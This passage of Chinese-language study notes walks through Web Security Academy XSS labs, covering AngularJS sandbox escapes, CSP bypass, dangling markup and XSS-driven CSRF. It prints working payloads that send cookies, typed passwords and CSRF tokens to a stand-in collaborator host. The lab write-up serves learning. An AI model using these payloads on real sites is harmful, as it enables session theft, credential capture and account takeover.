<pre class="language-markup" data-language="markup"><code class="language-markup">http://foo?<span class="token entity named-entity" title="&apos;">&amp;apos;</span>-alert(1)-<span class="token entity named-entity" title="&apos;">&amp;apos;</span></code></pre></li>
</ol>
<h5
id="lab-reflected-xss-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-unicode-escaped">Lab:
Reflected XSS into a template literal with angle brackets, single,
double quotes, backslash and backticks Unicode-escaped</h5>
<ul>
<li><p>Javascript 模板 <code>$&#123;...&#125;</code></p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Welcome, </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>user<span class="token punctuation">.</span>displayName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></code></pre></li>
</ul>
<ol type="1">
<li><p>分析<img src="https://s2.loli.net/2023/07/23/xXeortwNTcWYaG7.png"
alt="image-20230723142314448" /></p></li>
<li><p>payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">$<span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre></li>
</ol>
<h4 id="client-side-template-injection">Client-side template
injection</h4>
<ol type="1">
<li><p>The AngularJS sandbox is a mechanism that prevents access to
potentially dangerous objects, such as <code>window</code> or
<code>document</code>, in AngularJS template expressions. It also
prevents access to potentially dangerous properties, such as
<code>__proto__</code>.</p></li>
<li><p><strong>AngularJS沙箱</strong>的工作原理如下：</p>
<ol type="1">
<li>表达式解析：AngularJS首先对表达式进行解析，识别其中的JavaScript代码片段。</li>
<li>重写JavaScript：接下来，AngularJS会对解析后的JavaScript代码进行<strong>重写</strong>。这个过程包括对代码进行变换和添加一些限制，以确保其中不包含危险的操作。</li>
<li>安全性检测：经过重写后的代码将会被传递给一系列函数进行安全性检测。这些函数会检查代码中是否包含任何危险的对象或属性。
<ol type="1">
<li><code>ensureSafeObject()</code>:
检查给定的对象是否引用了自身，例如用于检测window对象。<br />
</li>
<li><code>ensureSafeMemberName()</code>:
检查对象的每个属性访问，如果包含危险的属性如<code>__proto__</code>或<code>__lookupGetter__</code>，则将被阻止访问。<br />
</li>
<li><code>ensureSafeFunction()</code>:
阻止对<code>call()</code>、<code>apply()</code>、<code>bind()</code>或<code>constructor()</code>等函数的调用。
通过这些安全性检测，</li>
</ol></li>
</ol></li>
<li><p>当攻击者成功地全局修改了<code>charAt()</code>函数，并将其覆盖为<code>[].join</code>方法时，<code>charAt()</code>函数的行为发生了改变，会将所有字符连接成一个字符串。这个修改后的<code>charAt()</code>函数可以在AngularJS表达式中利用，导致了沙箱逃逸漏洞。</p>
<p>假设在AngularJS的应用程序中，有一个表达式需要处理用户输入的数据，并根据用户提供的输入执行某些操作，例如：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> userInput <span class="token operator">=</span> <span class="token string">'Hello'</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> character <span class="token operator">=</span> userInput<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>正常情况下，上述代码会获取字符串<code>userInput</code>中索引为<code>index</code>的字符，并将其存储在变量<code>character</code>中。在这个例子中，<code>character</code>应该存储字符串<code>'H'</code>，因为索引0处的字符是<code>'H'</code>。</p>
<p>然而，攻击者进行了如下全局修改：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'a'</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>charAt <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">;</span></code></pre>
<p>现在，当表达式被执行时，<code>charAt()</code>函数实际上执行的是<code>[].join</code>方法，将字符串<code>userInput</code>中的所有字符连接成一个字符串。因此，即使<code>index</code>被设置为0，<code>character</code>中存储的值不再是<code>'H'</code>，而是整个<code>userInput</code>字符串，即<code>'Hello'</code>。</p>
<p>这就产生了漏洞：攻击者可以通过输入特定的表达式来触发被修改后的<code>charAt()</code>函数，并利用AngularJS提供的<code>$eval()</code>函数来执行恶意代码。例如，攻击者可以输入以下内容：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> userInput <span class="token operator">=</span> <span class="token string">'$eval("alert(\'Malicious Code Executed!\')")'</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> character <span class="token operator">=</span> userInput<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>当表达式被执行时，<code>charAt()</code>函数实际上执行的是<code>[].join</code>方法，将整个<code>userInput</code>字符串连接起来，即：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$eval</span><span class="token punctuation">(</span><span class="token string">"alert('Malicious Code Executed!')"</span><span class="token punctuation">)</span></code></pre></li>
<li><p>在这篇文章中，介绍了一种构建高级 AngularJS 沙箱逃逸（sandbox
escape）的方法。沙箱逃逸是指欺骗沙箱，让它认为恶意表达式是无害的，从而绕过安全限制。文章提供了一个情境，即某些网站可能限制您使用双引号或单引号等字符。在这种情况下，您需要使用诸如
<code>String.fromCharCode()</code> 等函数来生成字符。虽然 AngularJS
在表达式中阻止访问 <code>String</code>
构造函数，但可以通过使用字符串的构造函数属性来绕过这一限制。但是这显然需要一个字符串，因此要构造这样的攻击，您需要找到一种在不使用单引号或双引号的情况下创建字符串的方法。</p>
<p>通常的沙箱逃逸中，会使用 <code>$eval()</code> 函数来执行 JavaScript
负载（payload），但在这里提供的实验中，<code>$eval()</code>
函数是未定义的。幸运的是，可以使用 <code>orderBy</code>
过滤器来代替。<code>orderBy</code>
过滤器通常用于对对象进行排序，但它也接受一个表达式作为参数，这意味着我们可以使用它来传递负载。</p>
<p>具体而言，<code>orderBy</code> 过滤器的典型语法如下：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">]</span> <span class="token operator">|</span> orderBy<span class="token operator">:</span> <span class="token string">'Some string'</span></code></pre>
<p>在上面的代码中，我们将左侧的数组 <code>[123]</code> 传递给右侧的
<code>orderBy</code>
过滤器。冒号表示要传递给过滤器的参数，这里是一个字符串。<code>orderBy</code>
过滤器通常用于对对象进行排序，但在这里我们将其用于传递负载。</p>
<p>这篇文章旨在向读者展示如何构造一个更复杂的 AngularJS
沙箱逃逸，以绕过网站中对字符使用的限制。文章最后提到你已经拥有了解决下一个实验的所有工具。因此，如果您是网络安全研究人员，并且对沙箱逃逸和
AngularJS
安全有兴趣，这篇文章可能对您有所帮助。请记得在进行任何安全研究和测试时，遵循道德准则和法律法规，并仅在授权的范围内进行测试。</p></li>
</ol>
<h5
id="lab-reflected-xss-with-angularjs-sandbox-escape-without-strings">Lab:
Reflected XSS with AngularJS sandbox escape without strings</h5>
<ol type="1">
<li><p>payload</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//YOUR-LAB-ID.web-security-academy.net/?search=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1</span></span></code></pre>
<ol type="1">
<li><code>search=1</code>：这是一个正常的查询参数，其值为1。</li>
<li><code>toString().constructor.prototype.charAt%3d[].join</code>：这是整个Payload的第一部分，它的目的是修改<code>charAt()</code>函数，以使其行为变为将所有字符连接成一个字符串。<code>%3d</code>
是 URL
编码的等号（=），所以这里实际上是将<code>charAt()</code>函数覆盖为<code>[].join</code>。
接下来，我们来看整个Payload的第二部分：
<code>[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1</code>
1.
<code>[1]</code>：这是一个数组，数组中包含元素1。<code>|orderBy:</code>：这是AngularJS中的<code>orderBy</code>过滤器，它会对数组进行排序，但在这个Payload中并不关心排序，仅用于执行后面的表达式</li>
<li><code>toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1</code>：这是整个Payload的第二部分，它的目的是构造一个字符串来执行恶意代码。<code>toString()</code>用于将数字1转换为字符串，并接着使用<code>constructor</code>来访问String构造函数，然后使用<code>fromCharCode()</code>来将ASCII码转换为字符。在这里，ASCII码为<code>120,61,97,108,101,114,116,40,49,41</code>，它对应的字符是<code>x=alert(1)</code>。</li>
</ol></li>
</ol>
<hr />
<ol type="1">
<li><p>CSP（内容安全策略）绕过涉及HTML注入和使用特殊的AngularJS事件来执行沙箱逃逸。当AngularJS处于CSP模式下时，它改变了模板表达式的解析方式，并避免使用Function构造函数，使得标准的沙箱逃逸方法无效。</p>
<ol type="1">
<li><p>为了绕过CSP，AngularJS定义了自己的事件来代替被阻止的JavaScript事件。在事件中，AngularJS提供了一个特殊的<code>$event</code>对象，该对象是对浏览器事件对象的引用。通过使用这个对象，可以实现CSP绕过。</p></li>
<li><p>在Chrome浏览器中，<code>$event</code>对象有一个名为<code>path</code>的特殊属性，它包含导致事件执行的对象数组。在数组的最后，永远是<code>window</code>对象。通过将这个数组传递给<code>orderBy</code>过滤器，可以枚举数组并使用最后一个元素（<code>window</code>对象）来执行全局函数，例如<code>alert()</code>。</p></li>
<li><p>以下是一个示例，演示了如何进行CSP绕过：</p>
<p><code>html &lt;input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'"&gt;</code></p>
<p>在这个示例中，<code>ng-focus</code>属性设置为一个表达式，该表达式使用<code>$event.path</code>和<code>orderBy</code>过滤器。<code>orderBy</code>过滤器枚举从<code>$event.path</code>获取的数组，并在<code>window</code>对象上调用<code>alert()</code>函数。</p></li>
</ol>
<p>4.需要注意的是，直接调用<code>alert()</code>函数会被AngularJS沙箱检测并阻止。但是，通过结合<code>from()</code>函数和<code>orderBy</code>，它可以有效地隐藏<code>window</code>对象，从而允许注入恶意代码。</p></li>
<li><p>在"CSP与AngularJS沙箱逃逸"实验中，由于存在长度限制，之前提到的方法将不起作用。为了成功利用这个实验，需要想出各种方法来隐藏<code>window</code>对象，从而避免被AngularJS沙箱检测。其中一种可行的方法是使用<code>array.map()</code>函数。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>alert<span class="token punctuation">)</span></code></pre>
<ol type="1">
<li>CSP和AngularJS沙箱：CSP是一种浏览器安全功能，限制执行的内容以保护网站免受跨站脚本攻击（XSS）等。AngularJS沙箱是一种保护机制，限制解析和执行表达式时对全局对象和某些危险函数的访问，从而防止恶意代码的执行。</li>
<li>实验目标和长度限制：该实验设有长度限制，导致前面提到的方法无法生效。实验的目标是绕过CSP和AngularJS沙箱，执行恶意代码。</li>
<li>使用<code>array.map()</code>函数：为了绕过CSP和AngularJS沙箱，攻击者使用了<code>array.map()</code>函数。<code>array.map()</code>函数对数组中的每个元素应用一个函数，并返回结果构成的新数组。在这里，攻击者将<code>alert</code>函数作为参数传递给<code>[1].map()</code>，从而执行<code>alert()</code>函数。</li>
<li>绕过AngularJS沙箱：关键在于攻击者在调用<code>alert()</code>函数时，并没有显式引用<code>window</code>对象，而是直接使用<code>alert()</code>函数的引用。这样绕过了AngularJS对<code>window</code>对象的检测。</li>
<li>解决实验：为了解决该实验，攻击者需要尝试各种方法来执行<code>alert()</code>函数，而不触发AngularJS的<code>window</code>检测。在CSP环境下，某些函数调用和全局对象访问受到限制，攻击者需要找到适合的方法来绕过这些限制，并成功执行恶意代码。</li>
</ol></li>
</ol>
<h5 id="lab-reflected-xss-with-angularjs-sandbox-escape-and-csp">Lab:
Reflected XSS with AngularJS sandbox escape and CSP</h5>
<ol type="1">
<li><p>go to <code>exploit-server</code></p></li>
<li><p>payload(url解码后)</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
location<span class="token operator">=</span><span class="token string">'https://0a1300ee045ddc06810c9e6200ad008e.web-security-academy.net/?search=&lt;input id=x ng-focus=$event.composedPath()|orderBy:'</span><span class="token punctuation">(</span>z<span class="token operator">=</span>alert<span class="token punctuation">)</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token string">'>#x'</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
<ol type="1">
<li><p><code>location</code>修改页面URL,跳转到漏洞页面,并传入payload。</p></li>
<li><p><code>search</code>参数用于传入payload。</p></li>
<li><p><code>ng-focus=$event.composedPath()</code>
通过事件获取<code>$event</code>对象。</p></li>
<li><p><code>orderBy</code>过滤器遍历$event.path触发函数。</p></li>
<li><p><code>(z=alert)(document.cookie)</code>
将alert赋给z,并读取cookie。</p></li>
<li><p>通过orderBy的遍历调用z,实现无window引用的代码执行。</p></li>
<li><p>成功绕过沙箱限制,弹出警告框。</p></li>
</ol>
<p>总结:</p>
<ul>
<li>ng-focus事件绕过CSP策略</li>
<li>orderBy过滤器遍历触发执行函数</li>
<li>赋值给变量规避window引用检测</li>
<li>成功逃逸AngularJS沙箱</li>
</ul>
<p>这是一个典型的结合语言特性进行的高级逻辑绕过攻击,可见防止沙箱逃逸的难度。</p></li>
<li><figure>
<img src="https://s2.loli.net/2023/08/08/tHWo7b8CqOJze2U.png"
alt="image-20230808063406665" />
<figcaption aria-hidden="true">image-20230808063406665</figcaption>
</figure>
<ol type="1">
<li>store</li>
<li>send to victim</li>
</ol></li>
</ol>
<h4 id="exploiting-cross-site-scripting-vulnerabilities">Exploiting
cross-site scripting vulnerabilities</h4>
<ol type="1">
<li>三种最流行且功能强大的利用XSS漏洞的方法。
<ol type="1">
<li>使用弹窗函数：如前所述，简单地使用<code>alert()</code>函数来创建一个<strong>弹窗</strong>，以证明XSS漏洞的存在。这样的证明可能被用于漏洞报告或演示攻击者可以在受影响网站上执行任意JavaScript代码。</li>
<li><strong>Cookie盗取</strong>：通过XSS漏洞，攻击者可以在用户的浏览器中注入恶意代码，从而窃取用户的Cookie数据。一旦攻击者获得用户的Cookie，他们就可以模拟用户的会话，进行未经授权的操作。</li>
<li><strong>Session劫持</strong>：通过XSS漏洞，攻击者可以在用户的浏览器中注入恶意代码，从而在用户登录时捕获他们的会话令牌。攻击者可以使用捕获的令牌来劫持用户的会话，获取未经授权的访问权限。</li>
</ol></li>
<li>xss窃取Cookie的局限性
<ol type="1">
<li><strong>受害者可能未登录</strong>：如果受害者未登录或会话已过期，那么Cookie中可能不包含有用的信息。</li>
<li><strong>使用HttpOnly标记隐藏Cookie</strong>：许多应用程序在Cookie中使用HttpOnly标记，防止JavaScript访问Cookie，从而增加了攻击的难度。</li>
<li><strong>会话锁定</strong>：有些应用程序将会话与用户的IP地址等附加因素绑定，这样攻击者无法在其他地方使用会话。</li>
<li><strong>会话超时</strong>：攻击者可能需要时间来窃取和利用会话，但会话可能在攻击发生之前就已超时。</li>
</ol></li>
</ol>
<h5 id="lab-exploiting-cross-site-scripting-to-steal-cookies">Lab:
Exploiting cross-site scripting to steal cookies</h5>
<ol type="1">
<li><p>评论插入</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://BURP-COLLABORATOR-SUBDOMAIN'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
<span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
<span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span>
<span class="token literal-property property">body</span><span class="token operator">:</span>document<span class="token punctuation">.</span>cookie
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
<ol type="1">
<li><p>使用<code>fetch API</code>发起一个POST请求。</p></li>
<li><p>设置mode为<code>no-cors</code>,表示这是一个简单请求。</p></li>
<li><p>body中放入了document.cookie,会发送cookie内容。</p></li>
<li><p>请求<code>发送到</code>攻击者控制的域oastify.com。</p></li>
<li><p>由于是简单请求,浏览器<code>允许跨域</code>。</p></li>
<li><p>攻击者可以在oastify.com服务器上接收到含有cookie的POST数据。</p></li>
<li><p>这样就实现了利用XSS漏洞进行跨站数据窃取。</p></li>
</ol>
<p>原理总结:</p>
<ul>
<li>使用fetch API发起跨域请求</li>
<li>设置为简单请求绕过CORS</li>
<li>攻击者域名可接收数据</li>
<li>成功将数据发送到攻击者服务器</li>
</ul>
<p>这种技术手段巧妙利用了浏览器的同源策略漏洞,安全防护需要关注这类新型的跨站数据泄露风险。</p>
<ol type="1">
<li>'https://BURP-COLLABORATOR-SUBDOMAIN' 来源于<img
src="https://s2.loli.net/2023/08/08/5Pz3hRHk7CN9qQB.png"
alt="image-20230808072031393" /></li>
</ol></li>
<li><p>复制session<img
src="https://s2.loli.net/2023/08/08/v7WsRhAaPYCjq3D.png"
alt="image-20230808072111938" /></p></li>
<li><p>repeater 替换成窃取的session</p></li>
</ol>
<h5 id="lab-exploiting-cross-site-scripting-to-capture-passwords">Lab:
Exploiting cross-site scripting to capture passwords</h5>
<ol type="1">
<li><p>原理同上</p></li>
<li><p>payload</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>username</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>username</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>password</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>password</span> <span class="token special-attr"><span class="token attr-name">onchange</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://BURP-COLLABORATOR-SUBDOMAIN'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>
<span class="token literal-property property">method</span><span class="token operator">:</span><span class="token string">'POST'</span><span class="token punctuation">,</span>
<span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span>
<span class="token literal-property property">body</span><span class="token operator">:</span>username<span class="token punctuation">.</span>value<span class="token operator">+</span><span class="token string">':'</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>value
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span></code></pre></li>
<li><p>结果<img src="https://s2.loli.net/2023/08/08/gxHA2ToFvZJIsPX.png"
alt="image-20230808073719391" /></p></li>
</ol>
<h5 id="lab-exploiting-xss-to-perform-csrf">Lab: Exploiting XSS to
perform CSRF</h5>
<ol type="1">
<li><p>更改账户邮箱时，需要anti-csrf token<img
src="https://s2.loli.net/2023/08/08/jzTBQ51ke9XntWh.png"
alt="image-20230808075552337" /></p></li>
<li><p>payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token keyword">var</span> req <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>onload <span class="token operator">=</span> handleResponse<span class="token punctuation">;</span>
req<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">,</span><span class="token string">'/my-account'</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">handleResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> token <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">name="csrf" value="(\w+)"</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> changeReq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    changeReq<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'post'</span><span class="token punctuation">,</span> <span class="token string">'/my-account/change-email'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    changeReq<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'csrf='</span><span class="token operator">+</span>token<span class="token operator">+</span><span class="token string">'&amp;email=test@test.com'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
<ol type="1">
<li><p>创建一个<code>XMLHttpRequest</code>请求,获取用户设置页面。</p></li>
<li><p>在响应中正则匹配提取<code>csrf token</code>的值。</p></li>
<li><p>构造<strong>另一个请求</strong>,修改邮箱为攻击者的邮箱。</p></li>
<li><p>在请求中包含提取的csrf token。</p></li>
<li><p>发送修改邮箱的请求,完成对目标用户的CSRF攻击。</p></li>
<li><p>当目标用户浏览包含此payload的页面时,会自动在用户浏览器中完成整个攻击链。</p></li>
<li><p>用户会被未知地修改邮箱至攻击者指定的地址。</p></li>
</ol></li>
</ol>
<h4 id="dangling-markup-injection">Dangling markup injection</h4>
<ol type="1">
<li><code>悬挂式标记注入</code>（Dangling Markup
Injection）是一种在无法进行完整跨站脚本（XSS）攻击的情况下，捕获跨域数据的技术。</li>
</ol>
<h5
id="lab-reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack">Lab:
Reflected XSS protected by very strict CSP, with dangling markup
attack</h5>
<ol type="1">
<li><p>paylaod插入exploit server</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'//BURP-COLLABORATOR-SUBDOMAIN?'</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
location <span class="token operator">=</span> <span class="token string">'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=">&lt;a href="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me&lt;/a>&lt;base target='</span>'<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
<ol type="1">
<li>如果<code>window.name</code>不为空,则发送一个图片请求,包含window.name的数据。</li>
</ol>
<ul>
<li>这个请求会发送到Burp
Collaborator,被转发给<strong>攻击者</strong>。</li>
<li>window.name用于在页面间传递数据,可以包含<code>CSRF token</code>。</li>
</ul>
<ol start="2" type="1">
<li>如果window.name为空,则重定向到一个包含XSS payload的URL。</li>
</ol>
<ul>
<li>XSS
payload是一个链接,当<strong>用户点击</strong>时,会向exploit服务器发送请求。</li>
<li>请求包含用户当前的CSRF token。</li>
<li>exploit服务器可以获取token用于后续CSRF攻击。</li>
</ul>
<p>它实现了XSS和CSRF攻击的组合利用。漏洞防范需要考虑各种攻击行为的协同效应。</p></li>
<li><p>处理这个请求<img
src="https://s2.loli.net/2023/08/08/EGKeiC9Hw3W6xIn.png"
alt="image-20230808100839749" /></p>
<ol type="1">
<li><figure>
<img src="https://s2.loli.net/2023/08/08/OTMtGc2sVf63JQj.png"
alt="image-20230808223108176" />
<figcaption aria-hidden="true">image-20230808223108176</figcaption>
</figure></li>
</ol></li>
<li><p>替换为窃取到的csrf token<img
src="https://s2.loli.net/2023/08/08/fOlXemxC35dog4y.png"
alt="image-20230808100213085" /></p></li>
<li><p>copy html<img
src="https://s2.loli.net/2023/08/08/8qACd1Y2KotkMDF.png"
alt="image-20230808100259790" /></p></li>
<li><p>返回exploit server,粘贴<img
src="https://s2.loli.net/2023/08/08/4yucjeh7dgvSQaJ.png"
alt="image-20230808100335605" /></p></li>
<li><p>生成的html分析</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0a7d00e0049f116f800a12ff0082002d.web-security-academy.net/my-account/change-email<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hacker<span class="token entity" title="&#64;">&amp;#64;</span>evil<span class="token entity" title="&#45;">&amp;#45;</span>user<span class="token entity" title="&#46;">&amp;#46;</span>net<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>YFJA9CBLWed2lWvbngdLmaE6S8Bt3Hw4<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
      history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<ol type="1">
